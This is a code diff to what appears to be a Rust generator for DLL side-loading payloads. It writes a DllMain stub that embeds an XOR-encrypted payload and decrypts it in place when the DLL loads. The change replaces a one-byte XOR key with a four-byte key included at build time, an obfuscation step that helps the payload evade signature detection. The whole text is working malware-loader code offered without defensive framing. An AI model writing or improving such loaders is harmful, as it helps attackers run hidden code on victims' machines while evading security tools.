@@ -1,10 +1,15 @@
+include!(concat!(env!("OUT_DIR"), "/side_key.rs"));
+
 use std::env;
 use std::fs;
 
-fn encrypt_payload(data: &[u8]) -> (Vec<u8>, u8) {
-    let key = 0xAA; // Simple XOR key for demonstration
-    let enc: Vec<u8> = data.iter().map(|b| b ^ key).collect();
-    (enc, key)
+fn encrypt_payload(data: &[u8]) -> (Vec<u8>, [u8; 4]) {
+    let enc: Vec<u8> = data
+        .iter()
+        .enumerate()
+        .map(|(i, b)| b ^ SIDE_XOR_KEY[i % 4])
+        .collect();
+    (enc, SIDE_XOR_KEY)
 }
 
 fn main() {
@@ -91,11 +96,11 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOI
         unsafe {{ DisableThreadLibraryCalls(hinst); }}
         
         let enc_payload: [u8; {}] = [{}];
-        let key: u8 = 0x{:02X};
+        let key: [u8; 4] = [0x{:02X}, 0x{:02X}, 0x{:02X}, 0x{:02X}];
         
         let mut dec_payload = enc_payload;
-        for byte in dec_payload.iter_mut() {{
-            *byte ^= key;
+        for (i, byte) in dec_payload.iter_mut().enumerate() {{
+            *byte ^= key[i % 4];
         }}
 
         unsafe {{
@@ -137,7 +142,7 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOI
         stubs,
         enc_payload.len(),
         payload_bytes_str,
-        key
+        key[0], key[1], key[2], key[3]
     );
 
     fs::write("side_loaded.rs", code).unwrap();
